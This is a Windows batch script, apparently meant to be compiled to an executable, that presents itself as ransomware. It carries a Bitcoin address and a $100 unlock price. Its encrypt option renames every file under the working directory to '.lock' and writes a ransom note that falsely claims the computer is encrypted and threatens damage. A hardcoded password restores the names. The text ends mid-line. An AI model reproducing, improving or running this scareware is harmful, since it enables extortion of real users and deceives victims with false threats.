::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSjk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFBZdTwyDAE+/Fb4I5/jHzuSTqwALXfAqa8HewrHu
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
color 0C

rem Set the password
set "password=j1k3Vd4x4bSp4YKGumL9Emt54Bn"

:start
cls
echo  ____    __    _  _  ___  _____  __  __  _    _    __    ____  ____ 
echo (  _ \  /__\  ( \( )/ __)(  _  )(  \/  )( \/\/ )  /__\  (  _ \( ___)
echo  )   / /(__)\  )  ( \__ \ )(_)(  )    (  )    (  /(__)\  )   / )__) 
echo (_)\_)(__)(__)(_)\_)(___/(_____)(_/\/\_)(__/\__)(__)(__)(_)\_)(____)
echo github.com/poz38k
echo ____________________________________________________________
echo Bitcoin Address: bc1q9lk8kkenmwvzjt5064tdw0pwn7ywgte42kl6qh
echo Unlock Price: $100
echo ____________________________________________________________
echo 1. Encrypt files
echo 2. Unlock files
echo 3. Show Encrypted Files
echo 4. Exit
set /p choice=Enter your choice: 

rem Encrypt files option
if "%choice%"=="1" (
    cls
    rem Encrypt all files in the current directory and subdirectories
    for /r %%d in (*) do (
        if not "%%d"=="%~f0" (
            ren "%%d" "%%~nxd.lock"
        )
    )
    echo Your computer is encrypted. If you attempt to reset or fix your computer, it will be damaged. To receive the password needed to unlock your computer and files, please send 100 USD in Bitcoin to the following address: bc1q9lk8kkenmwvzjt5064tdw0pwn7ywgte42kl6qh > OH_NO_READ_ME_encrypted.txt
    echo Folders and files locked.
    pause
    goto start
)

rem Unlock files option
if "%choice%"=="2" (
    cls
    set /p unlockpassword=Enter the unlock code: 
    if NOT "%unlockpassword%"=="%password%" (
        echo Incorrect password.
        echo Press any key to try again
        pause >nul
        goto start
    ) else (
        rem Unlock all files in the current directory and subdirectories
        for /r %%f in (*.lock) do (
            ren "%%f" "%%~nf"
        )
        echo Folders and files unlocked.
    )
    pause
    goto start
)

rem Show Encrypted Files option
if "%choice%"=="3" (
    cls
    rem Show all the encrypted files in the current directory and subdirectories
    for /r %%f in (*.lock) do (
        echo "%%f"
    )
    echo Press any key to go back
    pause >nul
    goto start
)

rem Exit option
if "%choice%"=="4" (
    exit
)

rem Invalid choice
echo